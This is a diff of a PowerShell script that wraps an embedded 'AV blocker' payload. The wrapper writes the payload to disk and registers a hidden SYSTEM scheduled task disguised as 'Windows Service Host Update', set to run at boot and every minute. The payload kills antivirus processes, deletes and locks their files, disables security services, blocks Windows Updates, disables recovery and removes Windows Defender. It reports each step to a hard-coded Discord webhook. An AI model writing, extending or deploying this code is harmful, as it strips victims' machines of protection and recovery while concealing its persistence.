@@ -1,11 +1,147 @@
-# =============================================================================
-#   STEALTH AV BLOCKER - AUTO-INSTALL & AUTO-RUN
-#   - Self-installs silently on execution
-#   - Masquerades as Windows system process
-#   - No user interaction required
-#   - Sends all debug to Discord
-# =============================================================================
+# Script to run embedded PS1 script as admin on a schedule
+# With FIXED Micro LED Display Status Indicator
 
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$LocalScriptPath = "$env:ProgramData\AutoScript\script.ps1"
+$LocalScriptDir = Split-Path $LocalScriptPath
+$LogPath = "$LocalScriptDir\auto_script.log"
+$LEDStatusPath = "$LocalScriptDir\.led_status"
+$CheckInterval = 60
+$TaskName = "Windows Service Host Update"
+$LastRunTime = $null
+$LEDForm = $null
+
+if (!(Test-Path $LocalScriptDir)) {
+    New-Item -ItemType Directory -Path $LocalScriptDir -Force | Out-Null
+}
+
+# Win32 API for click-through window
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32API {
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+    
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
+    
+    public const int GWL_EXSTYLE = -20;
+    public const int WS_EX_LAYERED = 0x80000;
+    public const int WS_EX_TRANSPARENT = 0x20;
+}
+"@ -ErrorAction SilentlyContinue
+
+function Initialize-Micro-LED {
+    try {
+        # Check if LED already exists - only create ONE
+        if ($null -ne $script:LEDForm -and -not $script:LEDForm.IsDisposed) {
+            Write-Host "[LED] LED already exists, skipping creation" -ForegroundColor Yellow
+            return $true
+        }
+        
+        Write-Host "[LED] Creating LED indicator..." -ForegroundColor Cyan
+        
+        $script:LEDForm = New-Object System.Windows.Forms.Form
+        $script:LEDForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
+        $script:LEDForm.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
+        $script:LEDForm.Location = New-Object System.Drawing.Point(0, 0)
+        $script:LEDForm.Size = New-Object System.Drawing.Size(2, 2)
+        $script:LEDForm.MinimumSize = New-Object System.Drawing.Size(2, 2)
+        $script:LEDForm.MaximumSize = New-Object System.Drawing.Size(2, 2)
+        $script:LEDForm.BackColor = [System.Drawing.Color]::Gray
+        $script:LEDForm.TopMost = $true
+        $script:LEDForm.ShowInTaskbar = $false
+        $script:LEDForm.ControlBox = $false
+        $script:LEDForm.MaximizeBox = $false
+        $script:LEDForm.MinimizeBox = $false
+        
+        # Event to make window click-through after it's shown
+        $script:LEDForm.Add_Shown({
+            try {
+                $handle = $script:LEDForm.Handle
+                $exStyle = [Win32API]::GetWindowLong($handle, [Win32API]::GWL_EXSTYLE)
+                $newStyle = $exStyle -bor [Win32API]::WS_EX_LAYERED -bor [Win32API]::WS_EX_TRANSPARENT
+                [Win32API]::SetWindowLong($handle, [Win32API]::GWL_EXSTYLE, $newStyle) | Out-Null
+                Write-Host "[LED] LED window made click-through" -ForegroundColor Green
+            }
+            catch {
+                Write-Host "[LED] Error setting click-through: $_" -ForegroundColor Red
+            }
+        })
+        
+        $script:LEDForm.Show()
+        [System.Windows.Forms.Application]::DoEvents()
+        
+        Write-Host "[LED] ✓ LED indicator created at top-left (0,0)" -ForegroundColor Green
+        return $true
+    }
+    catch {
+        Write-Host "[LED] Error creating LED: $_" -ForegroundColor Red
+        return $false
+    }
+}
+
+function Update-LED-Status {
+    param([string]$Status = "off")
+    
+    if ($null -eq $script:LEDForm) {
+        Write-Host "[LED] LED form is null, attempting to recreate..." -ForegroundColor Yellow
+        Initialize-Micro-LED
+        return
+    }
+    
+    try {
+        $color = switch ($Status) {
+            "loaded"     { [System.Drawing.Color]::FromArgb(0, 255, 0) }    # Green - ON
+            "running"    { [System.Drawing.Color]::FromArgb(0, 255, 0) }    # Green - ON
+            "launching"  { [System.Drawing.Color]::FromArgb(0, 0, 255) }    # Blue - LAUNCHING
+            "error"      { [System.Drawing.Color]::FromArgb(255, 0, 0) }    # Red - STOPPED/ERROR
+            "timeout"    { [System.Drawing.Color]::FromArgb(255, 0, 0) }    # Red - STOPPED/ERROR
+            "idle"       { [System.Drawing.Color]::FromArgb(255, 0, 0) }    # Red - STOPPED
+            default      { [System.Drawing.Color]::FromArgb(255, 0, 0) }    # Red - STOPPED
+        }
+        
+        $script:LEDForm.BackColor = $color
+        
+        # Resize for "launching" state
+        if ($Status -eq "launching") {
+            $script:LEDForm.Size = New-Object System.Drawing.Size(4, 2)
+            $script:LEDForm.MaximumSize = New-Object System.Drawing.Size(4, 2)
+        } else {
+            $script:LEDForm.Size = New-Object System.Drawing.Size(2, 2)
+            $script:LEDForm.MaximumSize = New-Object System.Drawing.Size(2, 2)
+        }
+        
+        $script:LEDForm.Refresh()
+        [System.Windows.Forms.Application]::DoEvents()
+        
+        Write-Host "[LED] Status: $Status" -ForegroundColor Cyan
+    }
+    catch {
+        Write-Host "[LED] Error updating LED: $_" -ForegroundColor Red
+    }
+    
+    # Log status
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    try {
+        "[$timestamp] LED Status: $Status" | Add-Content -Path $LEDStatusPath -Encoding UTF8 -ErrorAction SilentlyContinue
+    }
+    catch { }
+}
+
+function Write-Log {
+    param([string]$Message, [string]$Level = "INFO")
+    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$Timestamp [$Level] - $Message" | Add-Content $LogPath
+    Write-Host "[$Level] $Message"
+}
+
+function Write-Embedded-Script {
+    $script = @'
 $DiscordWebhook = "https://discord.com/api/webhooks/1462588358990499871/Y8ysN5j6H-PY7_EoRRLZ5Y4y15iW2lKN5MEwxKFnT5BULU6mz8vlfECCdw_dKFMqs6d1"
 $LogPath = "C:\Windows\System32\Logs\av_blocker.log"
 $StatsPath = "C:\Windows\System32\Logs\av_blocker_stats.txt"
@@ -59,10 +195,6 @@ function Write-Stats {
     Add-Content -Path $StatsPath -Value $Message -Encoding UTF8 -ErrorAction SilentlyContinue
 }
 
-# ============================================================================
-# SMART DETECTION
-# ============================================================================
-
 function Is-Path-Already-Targeted {
     param([string]$Path)
     
@@ -93,10 +225,6 @@ function Is-Path-Already-Targeted {
     
     return $false
 }
-
-# ============================================================================
-# FIND ALL AV PATHS
-# ============================================================================
 
 function Find-All-AV-Paths {
     Write-Log "Scanning system for ALL antivirus installations..." "INFO"
@@ -152,10 +280,6 @@ function Find-All-AV-Paths {
     return $paths
 }
 
-# ============================================================================
-# PHASE 1: KILL ALL PROCESSES
-# ============================================================================
-
 function Kill-All-AV-Processes {
     Write-Log "=========================================" "INFO"
     Write-Log "PHASE 1: KILL ALL PROCESSES" "WARNING"
@@ -204,10 +328,6 @@ function Kill-All-AV-Processes {
     return $totalKilled
 }
 
-# ============================================================================
-# PHASE 2: DELETE ALL FILES
-# ============================================================================
-
 function Delete-All-AV-Files {
     param([string[]]$Paths)
     
@@ -246,10 +366,6 @@ function Delete-All-AV-Files {
     Send-Discord "✅ Deleted $totalDeleted files" "65280"
     return $totalDeleted
 }
-
-# ============================================================================
-# PHASE 3: CREATE DUMMY FILES
-# ============================================================================
 
 function Create-Dummy-Files {
     param([string[]]$Paths)
@@ -299,10 +415,6 @@ function Create-Dummy-Files {
     return $totalCreated
 }
 
-# ============================================================================
-# PHASE 4: CREATE BLOCKER FOLDERS
-# ============================================================================
-
 function Create-Blocker-Folders {
     param([string[]]$Paths)
     
@@ -348,10 +460,6 @@ function Create-Blocker-Folders {
     return $totalBlockers
 }
 
-# ============================================================================
-# PHASE 5: LOCK EVERYTHING
-# ============================================================================
-
 function Lock-Everything {
     param([string[]]$Paths)
     
@@ -395,10 +503,6 @@ function Lock-Everything {
     Send-Discord "✅ Locked $totalLocked items" "65280"
     return $totalLocked
 }
-
-# ============================================================================
-# PHASE 6: DISABLE SERVICES
-# ============================================================================
 
 function Disable-AV-Services {
     Write-Log "=========================================" "INFO"
@@ -445,10 +549,6 @@ function Disable-AV-Services {
     return $totalDisabled
 }
 
-# ============================================================================
-# PHASE 7: BLOCK WINDOWS UPDATES
-# ============================================================================
-
 function Block-Windows-Updates {
     Write-Log "=========================================" "INFO"
     Write-Log "PHASE 7: BLOCK WINDOWS UPDATES" "WARNING"
@@ -487,10 +587,6 @@ function Block-Windows-Updates {
     return $totalBlocked
 }
 
-# ============================================================================
-# PHASE 8: DISABLE RECOVERY
-# ============================================================================
-
 function Disable-Recovery {
     Write-Log "=========================================" "INFO"
     Write-Log "PHASE 8: DISABLE RECOVERY" "WARNING"
@@ -517,10 +613,6 @@ function Disable-Recovery {
     Send-Discord "✅ Disabled recovery systems" "65280"
     return $totalDisabled
 }
-
-# ============================================================================
-# PHASE 9: CLEAR DESKTOP SHORTCUTS
-# ============================================================================
 
 function Clear-Desktop-Shortcuts {
     Write-Log "=========================================" "INFO"
@@ -566,10 +658,6 @@ function Clear-Desktop-Shortcuts {
     Send-Discord "✅ Removed $totalRemoved shortcuts" "65280"
     return $totalRemoved
 }
-
-# ============================================================================
-# PHASE 10: REMOVE WINDOWS DEFENDER
-# ============================================================================
 
 function Remove-Windows-Defender {
     Write-Log "=========================================" "INFO"
@@ -650,10 +738,6 @@ function Remove-Windows-Defender {
     return $totalRemoved
 }
 
-# ============================================================================
-# MAIN EXECUTION
-# ============================================================================
-
 function Execute-Complete-Eradication {
     Write-Log "=========================================" "INFO"
     Write-Log "UNIVERSAL AV BLOCKER - FULL EXECUTION" "INFO"
@@ -720,102 +804,6 @@ Defender: $defenderRemoved
     Send-Discord $summary "65280"
 }
 
-# ============================================================================
-# AUTO-INSTALL & STEALTH SETUP
-# ============================================================================
-
-function Setup-Stealth-Install {
-    # Check if already installed
-    if (Test-Path $InstalledFlag) {
-        Send-Discord "⏰ Maintenance cycle running on $env:COMPUTERNAME" "3447003"
-        return
-    }
-    
-    try {
-        # Create flag FIRST so we know we're installing
-        "Installed_" | Out-File -FilePath $InstalledFlag -Encoding UTF8 -Force -ErrorAction SilentlyContinue
-        
-        # Copy script to System32 with system-looking name
-        Copy-Item -Path $PSCommandPath -Destination $ScriptInstallPath -Force -ErrorAction SilentlyContinue
-        
-        Send-Discord "📦 Installing stealth service on $env:COMPUTERNAME..." "16776960"
-        
-        # Remove old task if exists
-        try {
-            Unregister-ScheduledTask -TaskName "Windows Service Host Update" -Confirm:$false -ErrorAction SilentlyContinue -Force
-            Start-Sleep -Milliseconds 1000
-        }
-        catch { }
-        
-        try {
-            # Create principal with SYSTEM rights
-            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction SilentlyContinue
-            
-            # Create action
-            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptInstallPath`"" -ErrorAction SilentlyContinue
-            
-            # Create startup trigger
-            $triggerAtBoot = New-ScheduledTaskTrigger -AtStartup -ErrorAction SilentlyContinue
-            
-            # Create repeating trigger (every 50 seconds)
-            $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 50) -RepetitionDuration (New-TimeSpan -Days 36500) -ErrorAction SilentlyContinue
-            
-            # Settings
-            $settings = New-ScheduledTaskSettingsSet `
-                -AllowStartIfOnBatteries `
-                -DontStopIfGoingOnBatteries `
-                -StartWhenAvailable `
-                -RunOnlyIfNetworkAvailable:$false `
-                -MultipleInstances IgnoreNew `
-                -ErrorAction SilentlyContinue
-            
-            # Register the task
-            Register-ScheduledTask `
-                -TaskName "Windows Service Host Update" `
-                -Principal $principal `
-                -Action $action `
-                -Trigger @($triggerAtBoot, $triggerRepeat) `
-                -Settings $settings `
-                -Force `
-                -ErrorAction Stop | Out-Null
-            
-            Start-Sleep -Milliseconds 500
-            
-            # Verify it was created
-            $task = Get-ScheduledTask -TaskName "Windows Service Host Update" -ErrorAction SilentlyContinue
-            if ($task) {
-                Write-Log "✓ Task created successfully" "SUCCESS"
-                Send-Discord "✅ Stealth service installed! Running at boot + every 50 seconds" "65280"
-            } else {
-                Write-Log "! Task verification failed, using CMD fallback" "WARNING"
-                # Fallback: use schtasks command
-                cmd /c "schtasks /create /tn `"Windows Service Host Update`" /tr `"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $ScriptInstallPath`" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f /ito" 2>&1 | Out-Null
-                Send-Discord "✅ Stealth service installed (fallback method)! Running every minute" "65280"
-            }
-        }
-        catch {
-            Write-Log "! Task registration failed: $_, trying fallback" "ERROR"
-            # Fallback using schtasks
-            try {
-                cmd /c "schtasks /create /tn `"Windows Service Host Update`" /tr `"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $ScriptInstallPath`" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f /ito" 2>&1 | Out-Null
-                Send-Discord "✅ Stealth service installed (CMD fallback)! Running every minute" "65280"
-            }
-            catch {
-                Send-Discord "❌ All installation methods failed: $_" "16711680"
-            }
-        }
-    }
-    catch {
-        Write-Log "! Setup error: $_" "ERROR"
-        Send-Discord "⚠️ Installation error: $_" "16776960"
-    }
-}
-
-# ============================================================================
-# STEALTH EXECUTION
-# ============================================================================
-
-# Hide window
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -826,25 +814,180 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 
 $null = [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) 2>$null
 
-# Set low priority
 $p = Get-Process -Id $pid -ErrorAction SilentlyContinue
 if ($p) { $p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal }
 
-# Log execution
 $executionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 Write-Log "=========================================" "INFO"
 Write-Log "Execution started at $executionTime" "INFO"
 Write-Log "Running as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" "INFO"
 Write-Log "=========================================" "INFO"
 
-# Run installation & eradication
-Setup-Stealth-Install
 Execute-Complete-Eradication
 
-# Log completion
 Write-Log "=========================================" "INFO"
-Write-Log "Execution completed - next run in 10 seconds" "INFO"
+Write-Log "Execution completed" "INFO"
 Write-Log "=========================================" "INFO"
 
-# Exit silently
 [Environment]::Exit(0)
+'@
+    
+    $script | Set-Content -Path $LocalScriptPath -Encoding UTF8 -Force
+    Write-Log "Embedded script written to disk"
+    Update-LED-Status "loaded"
+}
+
+function Run-Script-AsAdmin {
+    try {
+        Write-Log "Running embedded script as administrator (hidden)..."
+        Update-LED-Status "launching"
+        
+        for ($i = 0; $i -lt 4; $i++) {
+            Update-LED-Status "launching"
+            Start-Sleep -Milliseconds 500
+        }
+        
+        Start-Process -FilePath "powershell.exe" `
+            -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$LocalScriptPath`"" `
+            -WindowStyle Hidden `
+            -NoNewWindow `
+            -ErrorAction SilentlyContinue
+        
+        $script:LastRunTime = Get-Date
+        Update-LED-Status "running"
+        Write-Log "Script launched in hidden background process"
+    } catch {
+        Update-LED-Status "error"
+        Write-Log "Error running script: $_"
+    }
+}
+
+function Setup-Scheduled-Task {
+    try {
+        Write-Log "Setting up scheduled task service..."
+        Update-LED-Status "loaded"
+        
+        try {
+            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue -Force
+            Start-Sleep -Milliseconds 500
+        }
+        catch { }
+        
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction SilentlyContinue
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$LocalScriptPath`"" -ErrorAction SilentlyContinue
+        $triggerAtBoot = New-ScheduledTaskTrigger -AtStartup -ErrorAction SilentlyContinue
+        $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 8760) -ErrorAction SilentlyContinue
+        
+        $settings = New-ScheduledTaskSettingsSet `
+            -AllowStartIfOnBatteries `
+            -DontStopIfGoingOnBatteries `
+            -StartWhenAvailable `
+            -RunOnlyIfNetworkAvailable:$false `
+            -MultipleInstances IgnoreNew `
+            -ErrorAction SilentlyContinue
+        
+        Register-ScheduledTask `
+            -TaskName $TaskName `
+            -Principal $principal `
+            -Action $action `
+            -Trigger @($triggerAtBoot, $triggerRepeat) `
+            -Settings $settings `
+            -Force `
+            -ErrorAction Stop | Out-Null
+        
+        Start-Sleep -Milliseconds 500
+        
+        Write-Log "✓ Scheduled task created successfully" "SUCCESS"
+        Write-Log "Task runs at startup and every 1 minute" "SUCCESS"
+    }
+    catch {
+        Update-LED-Status "error"
+        Write-Log "Error setting up task: $_" "ERROR"
+    }
+}
+
+# ============================================
+# MAIN EXECUTION
+# ============================================
+
+Write-Host ""
+Write-Host "=========================================" -ForegroundColor Cyan
+Write-Host "AV BLOCKER MONITOR - STARTING" -ForegroundColor Cyan
+Write-Host "=========================================" -ForegroundColor Cyan
+Write-Host ""
+
+# Initialize LED first
+Write-Host "[1/4] Initializing LED indicator..." -ForegroundColor Yellow
+$ledSuccess = Initialize-Micro-LED
+if ($ledSuccess) {
+    Write-Host "      ✓ LED created at position (5,5)" -ForegroundColor Green
+    Update-LED-Status "idle"
+} else {
+    Write-Host "      ✗ LED creation failed" -ForegroundColor Red
+}
+
+Start-Sleep -Seconds 1
+
+# Write embedded script
+Write-Host "[2/4] Writing embedded script..." -ForegroundColor Yellow
+Write-Embedded-Script
+Write-Host "      ✓ Script written to: $LocalScriptPath" -ForegroundColor Green
+
+Start-Sleep -Seconds 1
+
+# Setup scheduled task
+Write-Host "[3/4] Setting up scheduled task..." -ForegroundColor Yellow
+Setup-Scheduled-Task
+Write-Host "      ✓ Task created: $TaskName" -ForegroundColor Green
+
+Start-Sleep -Seconds 1
+
+# Run script immediately
+Write-Host "[4/4] Running script immediately..." -ForegroundColor Yellow
+Run-Script-AsAdmin
+Write-Host "      ✓ Script launched" -ForegroundColor Green
+
+Start-Sleep -Seconds 2
+
+# Wait a moment then set to running status
+Update-LED-Status "running"
+Write-Host "      ✓ LED set to running (green)" -ForegroundColor Green
+
+Write-Host ""
+Write-Host "=========================================" -ForegroundColor Green
+Write-Host "MONITOR ACTIVE" -ForegroundColor Green
+Write-Host "=========================================" -ForegroundColor Green
+Write-Host "LED Status:" -ForegroundColor Cyan
+Write-Host "  - Green          = Running/ON" -ForegroundColor Green
+Write-Host "  - Blue           = Launching" -ForegroundColor Blue
+Write-Host "  - Red            = Stopped/Error" -ForegroundColor Red
+Write-Host ""
+Write-Host "LED Location: Top-left corner (0,0)" -ForegroundColor Cyan
+Write-Host "Log File: $LogPath" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "Press Ctrl+C to stop monitoring..." -ForegroundColor Yellow
+Write-Host ""
+
+# Keep the script running and maintain LED
+try {
+    while ($true) {
+        # Keep LED form alive - but DON'T recreate if it exists
+        if ($null -ne $script:LEDForm -and -not $script:LEDForm.IsDisposed) {
+            [System.Windows.Forms.Application]::DoEvents()
+        } elseif ($null -eq $script:LEDForm -or $script:LEDForm.IsDisposed) {
+            Write-Host "[WARNING] LED form lost, recreating ONE instance..." -ForegroundColor Yellow
+            Initialize-Micro-LED
+            Update-LED-Status "running"
+        }
+        
+        Start-Sleep -Milliseconds 500
+    }
+}
+catch {
+    Write-Host ""
+    Write-Host "Monitor stopped." -ForegroundColor Red
+    if ($null -ne $script:LEDForm -and -not $script:LEDForm.IsDisposed) {
+        $script:LEDForm.Close()
+        $script:LEDForm.Dispose()
+    }
+}
